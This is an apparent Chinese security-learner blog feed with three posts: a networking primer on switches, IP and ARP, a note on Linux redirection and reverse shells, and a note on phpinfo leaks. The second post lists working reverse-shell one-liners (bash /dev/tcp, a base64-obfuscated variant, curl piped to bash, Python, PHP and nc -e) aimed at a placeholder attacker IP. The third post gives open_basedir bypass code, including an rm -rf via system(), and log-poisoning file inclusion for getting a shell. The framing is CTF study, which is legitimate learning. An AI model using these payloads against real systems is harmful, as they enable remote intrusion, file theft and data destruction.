    <content type="html"><![CDATA[<p>时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫</p><p><a href="https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ">如果让你来设计网络</a>这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。</p><p>真的十分感谢原作者呀！</p><span id="more"></span><h1 id="Hub-集线器"><a href="#Hub-集线器" class="headerlink" title="Hub/集线器"></a>Hub/集线器</h1><p>在它被应用之前，两台计算机<del>为了分享黄油合集</del>要建立通信，就得用网线直接将它们相连，其实貌似也只有这种办法了。</p><p>很快，更多的绅士们找到了黄油的来源，然后互相连起了网线，交流游van心door。</p><p>随着加入战斗的绅士越来越多，大家发现身上的网口开得实在有点多了，线也交错在一起，根本不好维护。</p><p><img src="/images/BUU/202203162155624.png"></p><p>即使我们真有这么多根网线，计算机也没有这么多网口的说。</p><p>这时一群有志于将黄油分享给全地球人的勇士们站了出来，发明了一个中间设备，起名给它叫做<strong>集线器</strong>。</p><p><img src="/images/BUU/202203162154454.png"></p><p>大家仅需把网线连在它的身上就好，随着网口和网线数量的减少，一切都变得有序了起来。</p><p>这个设备的工作只是负责转发，将收到的数据包<strong>广播</strong>给所有出口，仅此而已。</p><p>所以，为了让其余计算机得知发来的数据包究竟是不是自己该收下的那个，我们还需要一个身份证。</p><h1 id="Media-Access-Control-物理地址"><a href="#Media-Access-Control-物理地址" class="headerlink" title="Media Access Control/物理地址"></a>Media Access Control/物理地址</h1><p>也叫MAC地址，<strong>全球唯一</strong>。大概长<em>00:0C:29:CA:E4:66</em>这样，由网络设备制造商生产时烧录在网卡里。</p><blockquote><p>硬件的MAC地址是厂家按照一定的规则，进行设置所产生的，因此，MAC地址拥有自己的格式。</p><p>MAC 地址采用十六进制数表示，共 6 个字节（48 位），长度为 48bit（字节）。整个地址可以分为前 24 位和后 24 位，代表不同的含义。</p><p>前 24 位称为组织唯一标识符（Organizationally Unique Identifier，OUI），是由 IEEE 的注册管理机构给不同厂家分配的代码，区分了不同的厂家。</p><p>后 24 位是由厂家自己分配的，称为扩展标识符。同一个厂家生产的网卡中 MAC 地址后 24 位是不同的。</p></blockquote><p>利用这个全球唯一的特性，计算机在发送数据包时，只要在头部再拼接一点数据就好。</p><p><img src="/images/BUU/202203162155341.png"></p><p>其余计算机收到数据包后，根据头部的MAC地址信息，判断是否确实是发给自己的，就可以选择是<strong>收下</strong>还是<strong>丢弃</strong>了。</p><p>虽然集线器使整个布局干净不少，但原来只发给某台计算机的消息，现在却要发给连接到集线器中的所有设备，来，騙！（指大量垃圾数据包），来，偷袭！（指占用过多带宽）这好吗？这不好。更重要的是，这并不安全。</p><p>我劝！这位年轻集线器，耗子尾汁。</p><h1 id="Switch-交换机"><a href="#Switch-交换机" class="headerlink" title="Switch/交换机"></a>Switch/交换机</h1><p>要是集线器再智能一点，只会发包给目标MAC地址指向的那台计算机就又能解决大部分问题了。于是勇士们又发明了<strong>交换机</strong>。</p><p>交换机内部维护一张MAC地址表，记录着每一个MAC地址的设备，连接在其哪一个端口上。</p><p><img src="/images/BUU/202203162156314.png"></p><p>嘛，最开始的时候这张表必定是空的，这恒河里。但它逐步建立的过程也很好理解。</p><p>我们发送如下数据包</p><p><img src="/images/BUU/202203162155341.png"></p><p>已知此包从1号端口进，于是交换机记下</p><p>MAC：aa-aa-aa-aa-aa-aa-aa<br>端口：1</p><p>交换机在查看地址表发现没有目标映射，故技重施，将此包广播出去。</p><p>之后，目标计算机收到了此包，于是做出<strong>响应</strong>告诉交换机，交换机也会再发给我们发送一个响应信号，告诉双方：我滴任务，完成啦！啊哈哈哈哈哈哈（突发恶疾）</p><p>由于响应从2号端口进，于是交换机再记下</p><p>MAC：bb-bb-bb-bb-bb-bb<br>端口：2</p><p>如此各台计算机通信多次，地址表便建立完成。</p><p>就像我们小时候玩插座一样，总想着要是一个插座要能接到另一个插座里，就能用一个插孔换另一个插座数量的设备了。</p><p>我们完全不需要设计额外的东西，只需要按照之前的规矩来，按照上图的接线方式即可完成所有计算机的互联，所以交换机设计的这种布局，其实真的很巧妙。</p><p>最终，两个交换机将分别记录 A ~ H 所有机器的映射记录。</p><p><img src="/images/BUU/202203162200467.png"></p><p>这种设计在局域网内有几十甚至几百台电脑的时候，都能很好地工作，所以这种基于交换机的网络设计模式，支撑了好一阵子。</p><h1 id="Router-路由器"><a href="#Router-路由器" class="headerlink" title="Router/路由器"></a>Router/路由器</h1><p>但谁都没有想到，计算机在地球上的发展速度实在是太快，太快。数量很快就到了几万、几十万、几百万，交换机的地址表已经无法记录如此庞大的映射关系了。</p><p>很明显，问题就在于一台交换机连到另一台交换机上的那根线。千千万万个设备连接在一起，使地址表逐渐大得离谱。我们需要另增一个设备再次帮忙作转发。</p><p>这个设备就是路由器。作为一台每个端口都独立拥有MAC地址的设备，会帮我们把数据包再做一次转发。</p><p><img src="/images/BUU/202203162203659.png"></p><p>但是，现在我们想从主机A给主机C发送数据，单靠MAC地址的话，似乎不太行的通了。</p><p>因为交换机的工作仅着眼于MAC地址，一查地址表没有，广播后更是没有回应，它就光速进行一个班的下，表示我什么都做不到（指把包原封不动地还给你）。</p><p>这我们还指望路由器帮忙转发呢，看来得提前让主机自己判断一下，目标跟自己是不是在同一台交换机下才行。</p><h1 id="IP-互联网协议地址"><a href="#IP-互联网协议地址" class="headerlink" title="IP/互联网协议地址"></a>IP/互联网协议地址</h1><blockquote><p>于是你发明了一个新的地址，给每一台机器一个 32 位的编号，如：</p><p>11000000101010000000000000000001</p><p>你觉得有些不清晰，于是把它分成四个部分，中间用点相连。</p><p>11000000.10101000.00000000.00000001</p><p>你还觉得不清晰，于是把它转换成 10 进制。</p><p>192.168.0.1</p><p>最后你给了这个地址一个响亮的名字，IP 地址。现在每一台电脑，同时有自己的 MAC 地址，又有自己的 IP 地址，只不过 IP 地址是软件层面上的，可以随时修改，MAC 地址一般是无法修改的。</p><p>这样一个可以随时修改的 IP 地址，就可以根据你规划的网络拓扑结构，来调整了。</p></blockquote><p><img src="/images/BUU/202203162206381.png"></p><p>这时我们（主机A）可以说：</p><p><em>只要目标IP地址不为192.168.0开头，就全部发送给到路由器吧，之后再怎么转发，交给它！</em></p><p>太妙了！</p><p>这样一来，数据包的头部就被拼上了路由器的MAC地址。</p><p>现在两个设备之间的数据传输，得再加上一个头部了。</p><p><img src="/images/BUU/202203162205057.png"></p><h1 id="Subnet-子网-Subnet-Mask-子网掩码"><a href="#Subnet-子网-Subnet-Mask-子网掩码" class="headerlink" title="Subnet/子网 Subnet Mask/子网掩码"></a>Subnet/子网 Subnet Mask/子网掩码</h1><p>刚刚我们提到，<em>只要目标IP地址不为192.168.0开头</em>，其实就是在判断目标主机是否和自己在同一个<strong>子网</strong>下。</p><p>子网的划分是人为规定的，目的是将物理网络重构为逻辑网络，方便管理和提高安全性。</p><p>那对于计算机来说，就是通过<strong>子网掩码</strong>来做出判断的。</p><p>拿最常见的例子，<em>255.255.255.0</em>来说，即表示前24位正是子网所在的网段。</p><p>将其与自身IP、目标IP各作<code>&amp;</code>位运算：</p><p>192.168.0.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000000.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000000.00000000<br>= 192.168.0.0</p><p>192.168.1.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000001.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000001.00000000<br>= 192.168.1.0</p><p>计算机得知，我在192.168.0.0网段，他在192.168.1.0网段，于是我要发给路由器，就是这么简洁且易懂。</p><blockquote><p>其实说发给路由器不准确，应该说 A 会把包发给默认网关。</p><p>对 A 来说，A 只能直接把包发给同处于一个子网下的某个 IP 上，所以发给路由器还是发给某个电脑，对 A 来说也不关心，只要这个设备有个 IP 地址就行。</p><p>所以默认网关，就是 A 在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p></blockquote><h1 id="Routing-Table-路由表"><a href="#Routing-Table-路由表" class="headerlink" title="Routing Table/路由表"></a>Routing Table/路由表</h1><blockquote><p>路由器收到的数据包有目的 IP 也就是 C 的 IP 地址，需要转化成从自己的哪个端口出去，很容易想到，应该有个表，就像 MAC 地址表一样。</p><p>这个表就叫路由表。</p><p>不同于 MAC 地址表的是，路由表并不是一对一这种明确关系。</p></blockquote><p><img src="/images/BUU/202203162217267.png"></p><p>路由表就表示，192.168.0这个网段的，都转发到0号端口，192.168.1这个网段的，都转发到1号端口。</p><p>但路由表的生成可不像MAC表那么简单的说，它是由复杂的<a href="https://www.jianshu.com/p/cf74e5eab2c7">路由算法</a>生成的。</p><p>这里还有一列叫做<strong>下一跳</strong>的数据，这是在路由器连接到另一台路由器上时存在的。</p><h1 id="Address-Resolution-Protocol-地址解析协议"><a href="#Address-Resolution-Protocol-地址解析协议" class="headerlink" title="Address Resolution Protocol/地址解析协议"></a>Address Resolution Protocol/地址解析协议</h1><p>那现在假设我们的数据包经过重重转乘，终于来到了海的那边（指另一个子网），作为一名初来乍到的数据，它是怎么知道目标IP的MAC地址，从而通过交换机发过去的呢？</p><p>故技重施嘛，我们的电脑里还存在一张缓存表，表中记录着IP与MAC地址的映射关系，这就是<strong>ARP协议</strong>用到的的<strong>ARP协议缓存表</strong>。</p><blockquote><p>A封装好要发送的信息，在要写“收件地址”时，A会用子网掩码进行计算先判断C和A自己在不在同一个网段，这时候A知道了C和自己不在一个网段，</p><p>这时候，A知道该用网关把自己的数据传递给C，所以A会发送一个ARP包来获取网关的MAC地址，</p><p>网关收到ARP包后，把自己的MAC地址封装在ARP包中，发送给A，</p><p>A封装报文，目标MAC地址写网关的MAC地址，</p><p>网关收到报文，发现是给自己发的，就开始解包，解开之后，发现是给另一个网段的主机发送的，</p><p>此时如果网关本身就是路由器就直接把数据报文发送给下一跳路由器，如果网关是普通的PC，就发送给路由器，由路由器发送给下一跳路由器，目标MAC写下一跳路由器的MAC地址，</p><p>历经千辛万苦，报文终于到达C的主机的路由器，路由器发送报文到C所在网段的网关，C网段的网关解包之后发现不是给自己，而是给自己网段内的C主机，就发送报文给C了。</p></blockquote><p><img src="/images/BUU/202203162210708.png"></p><p>这样大家不断广播ARP请求，最终所有主机里面都会将ARP缓存表完善。</p><p>至此，我们的黄油网络终于算有点样子了。</p><p>所以我们要不忘初心，速速发我以黄油（bushi</p><p>最后附上一张用于总结复现的网络拓扑图</p><p><img src="/images/BUU/202203162212810.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ&quot;&gt;如果让你来设计网络&lt;/a&gt;这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。&lt;/p&gt;
&lt;p&gt;真的十分感谢原作者呀！&lt;/p&gt;</summary>
    
    
    
    
    <category term="Computer Networks" scheme="https://www.m0x01sery.com/tags/Computer-Networks/"/>
    
    <category term="Intranet penetration" scheme="https://www.m0x01sery.com/tags/Intranet-penetration/"/>
    
  </entry>
  
  <entry>
    <title>关于linux重定向和反弹shell</title>
    <link href="https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/"/>
    <id>https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/</id>
    <published>2022-02-19T16:00:00.000Z</published>
    <updated>2022-08-31T10:23:40.370Z</updated>
    
    <content type="html"><![CDATA[<p>先粗略地感受一手什么是linux的重定向功能</p><p>新建写有内容的文件<code>from.txt</code>和空文件<code>to.txt</code>，执行下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# cat &lt; from.txt &gt; to.txt</span><br><span class="line">root@localhost:~# cat to.txt</span><br></pre></td></tr></table></figure><p>发现<code>from.txt</code>文件里的内容被写入了<code>to.txt</code>。</p><p>要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。</p><span id="more"></span><blockquote><p>stdin：标准输入文件，其文件描述符为0，默认由此读取数据</p><p>stdout：标准输出文件，其文件描述符为1，默认向它输出数据</p><p>stderr：标准错误文件，其文件描述符为2，默认向它写入错误信息</p><p>当一个命令执行时，通常从“标准输入”读取输入，在默认情况下，该“标准输入”为我们的键盘。当一个命令将其输出写入到“标准输出”中时，在默认情况下，该“标准输出”是我们的显示器。</p><p>对于某些后台运行的程序，输入可能来自于外部的一些文件，运算的结果通常又写到其他的文件中。而且程序在运行的过程中，会有一些关键性的信息，比如异常堆栈，外部接口调用情况等，这些都会统统写到日志文件里。</p><p>如果某些情况下，我们需要将shell命令的执行结果存储到文件中，那么我们就需要使用输入输出的重定向功能。</p></blockquote><p>我们完全可以从字面意思上理解：</p><p>输入重定向：指的是重新指定设备来代替键盘作为新的输入设备</p><p>输出重定向：指的是重新指定设备来代替显示器作为新的输出设备。</p><p>通常是用文件或命令的执行结果来代替键盘作为新的输入设备。</p><p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令。</p><p>linux的一切皆文件的思想在这里也有体现叭。</p><p>在重定向的思想指导下，就诞生了今天的主角——反弹shell。</p><p>最经典的bash反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt;&amp; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>bash -i</code>：新建一个bash交互终端环境</p><p><code>&gt;&amp; /dev/tcp/233.33.3.333/2333</code>：这条命令用到了重定向绑定，等价于<code>1&gt; /dev/tcp/233.33.3.333/2333 2&gt;&amp;1</code>。意思就是让目标主机与攻击机<code>233.33.3.333</code>的<code>2333</code>端口建立一个tcp连接，并将本机的两个输出都绑定在攻击机的输出设备上（有点取地址符的意思）。这样被攻击的一方将看不见攻击方远程输入的命令，取而代之的现象是攻击机的屏幕上输出命令执行的结果前，会再次输出刚刚输入的命令。</p><p><code>0&gt;&amp;1</code>：同理，把标准输入也弹过来。</p><p>在控制变量<del>（乱改参数）</del>探索时遇到了个小疑惑：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>选择不将错误输出弹过来时，被攻击机（右）上仍会显示攻击方输入的命令。</p><p><img src="/images/BUU/202202222351390.png"></p><p>讲道理负责报错的来凑标准输出什么活（误</p><p>理想情况应该是这个亚子</p><p><img src="/images/BUU/202202222359286.png"></p><p>只能说学得太少，看到的种种都成了魔法（悲</p><p>挖个坑先</p><p>攻击机nc监听对应端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# nc -lvp 2333</span><br></pre></td></tr></table></figure><p><code>-l</code>：开启监听模式而不是主动连接</p><p><code>-v</code>：显示命令执行过程</p><p><code>-p</code>：指定端口</p><p>这样就能满足大部分场景需求了。</p><p>而反弹shell的难点在于，人家显然不会乖乖让我们把这种常见的危险命令直接跑进命令行里（指空格 关键字都被康了</p><p>你太baby辣！（指拒绝乖乖♂站好输命令）看我不把你李宁踹开线（指利用其它环境或编码</p><h1 id="冷油开锅"><a href="#冷油开锅" class="headerlink" title="冷油开锅"></a>冷油开锅</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMzMuMzMuMy4zMzMvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; # base64编码绕过空格</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 233.33.3.333/bash.html|bash # 把bash命令写入本地html文件即可</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;233.33.3.333&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; # 要求目标机有python环境</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;233.33.3.333&quot;, 2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; # 要求目标机有php交互式环境</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 233.33.3.333 2333 # 要求存在特定版本nc 存在-e 选项就能直接反弹shell</span><br></pre></td></tr></table></figure><p>等等等等（摸摸摸摸</p><p>还有很多其它可行的姿势，看了其它师傅们的总结才能对比出我的思维有多么单调，要学的还有很多呢</p><p><a href="https://xz.aliyun.com/t/2549#toc-5">反弹shell的本质</a></p><p><a href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先粗略地感受一手什么是linux的重定向功能&lt;/p&gt;
&lt;p&gt;新建写有内容的文件&lt;code&gt;from.txt&lt;/code&gt;和空文件&lt;code&gt;to.txt&lt;/code&gt;，执行下面的命令&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@localhost:~# cat &amp;lt; from.txt &amp;gt; to.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root@localhost:~# cat to.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;发现&lt;code&gt;from.txt&lt;/code&gt;文件里的内容被写入了&lt;code&gt;to.txt&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。&lt;/p&gt;</summary>
    
    
    
    
    <category term="linux" scheme="https://www.m0x01sery.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>phpinfo泄漏</title>
    <link href="https://www.m0x01sery.com/2021/12/25/phpinfo/"/>
    <id>https://www.m0x01sery.com/2021/12/25/phpinfo/</id>
    <published>2021-12-24T16:00:00.000Z</published>
    <updated>2021-12-25T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>一说到phpinfo页面，之前对它的印象总是停留在 仅仅是一个测试是否getshell的标志 而已。但后来看到它的次数多了之后，逐渐意识到其实不应该忽略它所承载的各种配置详情。有时候是某个服务的开启与关闭，有时候是用户允许访问的文件范围，有时候是日志的绝对路径……周大福有时也会直接给出phpinfo页面，明摆着要我们从这些眼花缭乱的配置信息中找到突破。总之，学会看phpinfo百利而无一害，一定是值得花写这篇笔记的时间的呢。</p><p>这篇笔记将不定时更新</p><p><del>不更新才怪了 这才学多少哦 拉得一匹还好意思咕是吧</del></p><span id="more"></span><h1 id="厨具整理"><a href="#厨具整理" class="headerlink" title="厨具整理"></a>厨具整理</h1><h2 id="敏感配置"><a href="#敏感配置" class="headerlink" title="敏感配置"></a>敏感配置</h2><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p>php.ini配置文件里的禁用函数列表。</p><p>连上shell发现无法使用<code>system()</code>等函数执行命令时可以来这看看情况再决定下一步。</p><p>蚁剑有个绕过<strong>disable_functions</strong>的<a href="https://blog.csdn.net/zlzg007/article/details/108462813">插件，贼好用</a>的说</p><h3 id="allow-url-fopen-amp-allow-url-include"><a href="#allow-url-fopen-amp-allow-url-include" class="headerlink" title="allow_url_fopen &amp; allow_url_include"></a>allow_url_fopen &amp; allow_url_include</h3><p><strong>allow_url_fopen</strong>没什么好说的。默认开启，允许将url作为文件处理。</p><p>主要是<strong>allow_url_include</strong>，远程文件包含漏洞的灵魂</p><p>从php5.2开始<strong>allow_url_include</strong>默认是关闭的，这两个配置同时On后将允许<code>include/require</code>包含url文件，十分危险。</p><p><img src="/images/BUU/202112261743295.png"></p><p><strong>allow_url_include</strong>开启而<strong>allow_url_fopen</strong>关闭的情况下，仍然可利用<code>php://input</code>伪协议打穿文件包含漏洞。</p><p><img src="/images/BUU/202112261753114.png"></p><p>总之对<strong>allow_url_include</strong>保持敏感。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><blockquote><p><strong>open_basedir</strong>可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径，也可用符号”.”来代表当前目录。</p><p>注意用open_basedir<strong>指定的限制实际上是路径前面的部分</strong>，而不是目录名。</p><p>举例来说：若”open_basedir=/dir/user”，那么目录”/dir/user”和”/dir/user233”都是可以访问的。</p><p>当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</p><p>所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成:”open_basedir = /dir/user/“</p><p>使用open_basedir可以限制程序可操作的目录和文件，提高系统安全性。但会影响I/O性能导致系统执行变慢，因此需要根据具体需求，在安全与性能上做平衡。</p></blockquote><p><img src="/images/BUU/202112261904065.png"></p><p><strong>来嘛，绕嘛</strong></p><p><strong>1.命令执行函数绕过</strong></p><p><strong>open_basedir</strong>的设置对<code>system</code>等命令执行函数是无效的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf ../target.php&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../target.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.<code>symlink()</code></strong></p><blockquote><p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE。如果失败，则返回FALSE。</p><p>该函数不能在Windows平台上执行。</p></blockquote><p>使用例</p><p>设置<strong>open_basedir</strong>为<code>/var/www/html/</code>。</p><p>尝试读取<code>/var/www/</code>下面的<code>target.txt</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;door&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;door&quot;</span>,<span class="string">&quot;tmp&quot;</span>);<span class="comment">//建立一个符号连接指向door，door是刚刚建立的目录文件</span></span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmp/../../target.txt&quot;</span>,<span class="string">&quot;gogogo&quot;</span>);<span class="comment">//这个时候tmp是符号链接文件，它指向的路径是door，因此这个时候gogogo指向的路径是：door/../../target.txt，door是在html目录下新建的目录，符合open_basedir的范围要求，所以建立成立</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmp&quot;</span>);<span class="comment">//删除符号链接</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmp&quot;</span>);<span class="comment">//新建tmp目录，导致gogogo指向的路径变成了tmp/../../，在tmp所在目录(也就是html目录)向上跳了一个目录</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://127.0.0.1/gogogo&quot;</span>);<span class="comment">//这个地方调用了链接gogogo，读取到了上一级目录下的target.txt</span></span><br></pre></td></tr></table></figure><p>要说防御手段也很简单粗暴，在最开始提到的<strong>disable_functions</strong>里把相关函数如<code>mkdir()</code> <code>chdir()</code> <code>symlink()</code>等相关函数禁掉就可以了。</p><p><strong>3.DirectoryIterator + glob伪协议</strong></p><p>上一篇博客 <a href="https://m1serry.github.io/2021/12/21/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">关于php伪协议</a> 中已有粗略的相关说明。</p><p>这一篇再提到它是为了加深<strong>它能无视open_basedir限制遍历目录</strong>的印象，当然也就包括人见人爱的根目录。</p><blockquote><p>如ctfshow web72:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有open_basedir的限制</p><p><img src="/images/BUU/202112262215346.png"></p><p>可以用上面的方式绕过</p><p><img src="/images/BUU/202112262216878.png"></p></blockquote><h2 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h2><p>当我们没有上传点 也没有<strong>url_allow_include</strong>设置On，但存在文件包含漏洞时，我们就可以考虑包含服务器的日志文件。</p><p>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为。当我们的请求内容中包含php一句话木马时，也会被记录到日志中。</p><p>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实包含日志文件漏洞最关键的点就是找到日志存放的绝对路径，只要找到了日志的绝对存放路径，基本就只剩一把梭哈了。</p><p>phpinfo将泄露其绝对路径（如apache的<strong>APACHE_LOG_DIR</strong>配置项。</p><p>一般分为<strong>访问日志(Access Logs)</strong> 和 <strong>错误日志(Error Logs)</strong> 两种</p><p>这里以访问日志包含进行本地演示。</p><p>访问日志默认关闭，需在<strong>httpd-conf</strong>中手动开启</p><p>什么？你问我为什么不拿错误日志演示？</p><p><strong>经过了十分钟的反复对比实验，十分主观地得到了一个十分粗糙的结论：</strong></p><p>错误日志在写入记录时会进行HTML实体转义导致<code>&lt;</code> <code>&gt;</code> 这类符号变成<code>&amp;lt;</code> <code>&amp;gt;</code>实体，抓包修改URL转义后同样无法绕过，导致php代码的开始和结束标志<code>&lt;?php</code>无法被解析到，也就不存在什么命令注入的机会了</p><p><img src="/images/BUU/202112271754238.png"></p><p>访问日志在写入记录时只进行了URL转义使得<code>&lt;</code> <code>&gt;</code> 变成<code>%3C</code> <code>%3E</code>，但与HTML转义不同的是，这是能通过抓包修改回来的说</p><p>抓包修改前</p><p><img src="/images/BUU/202112271917442.png"></p><p>抓包修改后</p><p><img src="/images/BUU/202112271915507.png"></p><p>再对其绝对路径进行一个<code>include()</code></p><p><img src="/images/BUU/202112271920067.png"></p><p>爽到</p><p>关于为什么两个日志文件要转义以及为什么转义方式有所不同，暂时还没在精神网路<del>（什么Cytus）</del>上找到关联度比较高的讲解。</p><p>上述结论完全基于个人对比发现，多少会有不清不楚的地方，希望自己能早日弄明白</p><p>也许该学会英文搜索了呢</p>]]></content>
    
    
